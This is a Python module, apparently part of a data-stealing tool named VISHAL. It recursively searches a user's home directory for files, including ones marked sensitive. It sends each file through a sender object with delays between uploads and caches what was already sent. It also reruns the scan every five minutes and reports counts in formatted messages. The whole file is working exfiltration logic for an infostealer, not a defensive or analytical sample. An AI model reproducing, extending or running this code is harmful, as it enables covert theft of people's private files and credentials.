"""
VISHAL File Scanner Module
"""
import os
import glob
import time
import threading
from pathlib import Path
from datetime import datetime
from .config import Config
from .utils import Utils

class FileScanner:
    """File Scanner Class"""
    
    def __init__(self, sender):
        self.sender = sender
        self.home = str(Path.home())
        self.scanned_files = set()
        self.running = True
        self.stats = {
            "scanned": 0,
            "sent": 0,
            "skipped": 0
        }
        
        # Load previously scanned files
        self.load_cache()
    
    def load_cache(self):
        """Load scanned files cache"""
        cached = Utils.load_cache('scanned_files.json')
        if cached:
            self.scanned_files = set(cached)
            self.stats['scanned'] = len(self.scanned_files)
    
    def save_cache(self):
        """Save scanned files cache"""
        Utils.save_cache(list(self.scanned_files)[-10000:], 'scanned_files.json')
    
    def scan_and_send(self, extensions=None, max_files=1000):
        """Scan and send files"""
        if extensions is None:
            extensions = Config.get_all_extensions()
        
        found_files = []
        
        for ext in extensions:
            if not self.running:
                break
            
            # Scan home directory
            pattern = os.path.join(self.home, "**", ext)
            files = glob.glob(pattern, recursive=True)
            
            for file_path in files[:max_files]:
                if file_path in self.scanned_files:
                    self.stats['skipped'] += 1
                    continue
                
                try:
                    size = os.path.getsize(file_path)
                    if size <= Config.MAX_FILE_SIZE:
                        found_files.append(file_path)
                        self.scanned_files.add(file_path)
                        self.stats['scanned'] += 1
                except:
                    continue
        
        # Send files
        for file_path in found_files[:max_files]:
            if self.running:
                if self.sender.send_file(file_path):
                    self.stats['sent'] += 1
                time.sleep(Config.DELAY_BETWEEN_FILES)
        
        self.save_cache()
        return found_files
    
    def scan_sensitive_files(self):
        """Scan only sensitive files"""
        sensitive_files = []
        
        for ext in Config.get_sensitive_extensions():
            pattern = os.path.join(self.home, "**", ext)
            files = glob.glob(pattern, recursive=True)
            
            for file_path in files:
                if Config.is_sensitive(file_path):
                    sensitive_files.append(file_path)
        
        return sensitive_files
    
    def scan_web_files(self):
        """Scan web-related files"""
        web_files = []
        
        for ext in Config.get_web_extensions():
            pattern = os.path.join(self.home, "**", ext)
            files = glob.glob(pattern, recursive=True)
            web_files.extend(files[:200])
        
        return web_files
    
    def continuous_scan(self, interval=300):
        """Continuous scanning"""
        self.sender.send_message("🔄 <b>Continuous Scan Started</b>")
        
        while self.running:
            # Scan and send new files
            new_files = self.scan_and_send()
            
            if new_files:
                msg = f"📦 Found {len(new_files)} new files"
                self.sender.send_message(msg)
            
            # Wait for next scan
            time.sleep(interval)
    
    def get_stats(self):
        """Get scanning statistics"""
        return self.stats
    
    def stop(self):
        """Stop scanner"""
        self.running = False
        self.save_cache()